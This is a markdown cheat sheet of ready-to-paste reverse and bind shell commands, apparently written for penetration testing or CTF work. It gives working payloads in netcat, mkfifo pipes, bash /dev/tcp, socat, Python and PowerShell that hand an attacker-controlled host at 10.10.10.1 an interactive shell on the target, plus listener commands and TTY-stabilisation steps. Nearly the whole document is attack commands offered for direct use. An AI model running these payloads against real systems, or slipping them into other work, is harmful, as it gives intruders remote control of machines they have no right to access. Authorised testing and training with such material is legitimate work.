# 🐚 Shells Cheat Sheet — Reverse & Bind

A shell gives you command execution on a target. There are two ways to wire it up — the difference is **who listens** and **who connects**.

| | Listens (server) | Connects (client) | When to use |
| --- | --- | --- | --- |
| **Reverse shell** | 🧑‍💻 **Attacker** | 🎯 Target | Target is behind a firewall/NAT — it can reach *out* to you (most common) |
| **Bind shell** | 🎯 **Target** | 🧑‍💻 Attacker | Target's port is directly reachable from your machine |

> ⚠️ Replace `10.10.10.1` with **your** attacking IP (`tun0` on a VPN box), `10.10.10.2` with the **target** IP, and `4444` with your chosen port.

---

# 🔄 Reverse Shell

> Attacker listens (server), target connects back (client) and runs a shell.

## 1. Listener (attacker — run first)

| Command | Description |
| --- | --- |
| `nc -lvnp 4444` | Basic netcat listener |
| `rlwrap nc -lvnp 4444` | Listener with readline (arrow keys/history) |
| `socat file:` + "`tty`,raw,echo=0 tcp-listen:4444" | Full-TTY socat listener |

```bash
# socat listener (gives you a proper interactive TTY)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## 2. Payload (target — connects back)

### netcat (with -e)
```bash
nc 10.10.10.1 4444 -e /bin/bash
```

### netcat (no -e — mkfifo)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.1 4444 >/tmp/f
```

### bash
```bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
```

### socat (full TTY)
```bash
socat tcp-connect:10.10.10.1:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

### python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"
```

---

# 🔗 Bind Shell

> Target listens (server) and exposes a shell, attacker connects in (client).

## 1. Listener (target — run first)

### netcat (with -e)
```bash
nc -lvnp 4444 -e /bin/bash
```

### netcat (no -e — mkfifo)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvnp 4444 >/tmp/f
```

### socat (full TTY, handles multiple connections)
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

## 2. Connect (attacker)

### netcat
```bash
nc 10.10.10.2 4444
```

### socat (full TTY)
```bash
socat file:`tty`,raw,echo=0 tcp:10.10.10.2:4444
```

---

# ⬆️ Upgrade / Stabilise a Shell

A raw shell has no tab-completion, arrow keys, or job control. Upgrade it to a full TTY:

```bash
# Step 1 — spawn a PTY (use whichever exists on the target)
python3 -c 'import pty;pty.spawn("/bin/bash")'
#   or:  script /dev/null -c bash

# Step 2 — background it
Ctrl+Z

# Step 3 — fix your local terminal, then foreground
stty raw -echo; fg
# (press Enter a couple of times)

# Step 4 — set terminal type & size
export TERM=xterm
stty rows 38 columns 116
```

> 💡 **socat** shells (`pty,stderr,setsid,sigint,sane`) are already fully interactive — no upgrade needed. That's the main reason to prefer socat when it's available on the target.

---

## 🧰 Tip

[**revshells.com**](https://www.revshells.com) generates reverse **and** bind shells for any IP/port/language, including the matching listener commands. Indispensable when you can't recall the exact syntax mid-engagement.
